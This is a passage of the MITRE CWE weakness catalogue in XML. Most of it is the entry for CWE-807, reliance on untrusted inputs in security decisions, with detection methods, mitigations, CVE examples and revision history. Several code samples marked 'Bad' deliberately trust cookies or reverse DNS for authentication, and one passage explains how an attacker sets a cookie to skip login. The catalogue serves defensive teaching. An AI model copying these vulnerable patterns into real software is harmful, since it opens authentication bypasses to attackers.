	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SI-2</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SVV-1</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SVV-3</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-2</Entry_ID>
	     <Entry_Name>Req CR 3.5</Entry_Name>
	   </Taxonomy_Mapping>
	 </Taxonomy_Mappings>
         <References>
	    <Reference External_Reference_ID="REF-1029"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 5, &#34;Stack Overruns&#34; Page 129"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 5, &#34;Heap Overruns&#34; Page 138"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 5: Buffer Overruns.&#34; Page 89"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Nonexecutable Stack&#34;, Page 76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 5, &#34;Protection Mechanisms&#34;, Page 189"/>
            <Reference External_Reference_ID="REF-90"/>
            <Reference External_Reference_ID="REF-56"/>
            <Reference External_Reference_ID="REF-57"/>
            <Reference External_Reference_ID="REF-58"/>
            <Reference External_Reference_ID="REF-60"/>
            <Reference External_Reference_ID="REF-61"/>
            <Reference External_Reference_ID="REF-64"/>
	    <Reference External_Reference_ID="REF-1332"/>
	    <Reference External_Reference_ID="REF-1333"/>
	    <Reference External_Reference_ID="REF-1334"/>
	    <Reference External_Reference_ID="REF-1335"/>
	    <Reference External_Reference_ID="REF-1336"/>
	    <Reference External_Reference_ID="REF-1337" Section="Memory information leaks"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-10-21</Submission_Date>
               <Submission_Version>1.6</Submission_Version>
               <Submission_ReleaseDate>2009-10-29</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Alternate_Terms, Common_Consequences, Description, Diagram, Weakness_Ordinalities</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
	    <Contribution Type="Content">
	      <Contribution_Name>Abhi Balakrishnan</Contribution_Name>
	      <Contribution_Date>2024-02-29</Contribution_Date>
	      <Contribution_Version>4.15</Contribution_Version>
	      <Contribution_ReleaseDate>2024-07-16</Contribution_ReleaseDate>
	      <Contribution_Comment>Provided diagram to improve CWE usability</Contribution_Comment>
	    </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="807" Name="Reliance on Untrusted Inputs in a Security Decision" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.</Description>
         <Extended_Description>
            <xhtml:p>Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.</xhtml:p>
            <xhtml:p>Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>The effectiveness and speed of manual analysis will be reduced if the there is not a centralized security mechanism, and the security logic is widely distributed throughout the software.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-14">
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store state information and sensitive data on the server side only.</xhtml:p>
                  <xhtml:p>Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.</xhtml:p>
                  <xhtml:p>If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.2">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>With a stateless protocol such as HTTP, use a framework that maintains the state for you.</xhtml:p>
                  <xhtml:p>Examples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45].</xhtml:p>
                  <xhtml:p>Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-15">
               <Intro_Text>The following code excerpt reads a value from a browser cookie to determine the role of the user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:1em;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("role")) {<xhtml:div style="margin-left:1em;">userRole = c.getValue();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-16">
               <Intro_Text>The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$auth = $_COOKIES['authenticated'];<xhtml:br/>if (! $auth) {<xhtml:div style="margin-left:1em;">if (AuthenticateUser($_POST['user'], $_POST['password']) == "success") {<xhtml:div style="margin-left:1em;">// save the cookie to send out in future responses<xhtml:br/>setcookie("authenticated", "1", time()+60*60*2);</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">ShowLoginScreen();<xhtml:br/>die("\n");</xhtml:div>}</xhtml:div>}<xhtml:br/>DisplayMedicalHistory($_POST['patient_ID']);</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that the AuthenticateUser() check will always be applied, and the "authenticated" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.</Body_Text>
               <Body_Text>However, the attacker can set the "authenticated" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-17">
               <Intro_Text>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:1em;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("authenticated") &amp;&amp; Boolean.TRUE.equals(c.getValue())) {<xhtml:div style="margin-left:1em;">authenticated = true;</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-93">
               <Intro_Text>The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>struct hostent *hp;struct in_addr myaddr;<xhtml:br/>char* tHost = "trustme.example.com";<xhtml:br/>myaddr.s_addr=inet_addr(ip_addr_string);<xhtml:br/>
                     <xhtml:br/>hp = gethostbyaddr((char *) &amp;myaddr, sizeof(struct in_addr), AF_INET);<xhtml:br/>if (hp &amp;&amp; !strncmp(hp-&gt;h_name, tHost, sizeof(tHost))) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>} else {<xhtml:div style="margin-left:1em;">trusted = false;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String ip = request.getRemoteAddr();<xhtml:br/>InetAddress addr = InetAddress.getByName(ip);<xhtml:br/>if (addr.getCanonicalHostName().endsWith("trustme.com")) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);<xhtml:br/>IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);<xhtml:br/>if (hostInfo.HostName.EndsWith("trustme.com")) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-1549</Reference>
               <Description>Attacker can bypass authentication by setting a cookie to a specific value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1549</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1619</Reference>
               <Description>Attacker can bypass authentication and gain admin privileges by setting an "admin" cookie to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1619</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0864</Reference>
               <Description>Content management system allows admin privileges by setting a "login" cookie to "OK."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5784</Reference>
               <Description>e-dating application allows admin privileges by setting the admin cookie to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5784</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6291</Reference>
               <Description>Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to "admin."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6291</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC09-J</Entry_ID>
               <Entry_Name>Do not base security checks on untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-754"/>
            <Reference External_Reference_ID="REF-529"/>
            <Reference External_Reference_ID="REF-756"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-01-18</Submission_Date>
               <Submission_Version>1.8</Submission_Version>
               <Submission_ReleaseDate>2010-02-16</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="829" Name="Inclusion of Functionality from Untrusted Control Sphere" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.</Description>
         <Extended_Description>
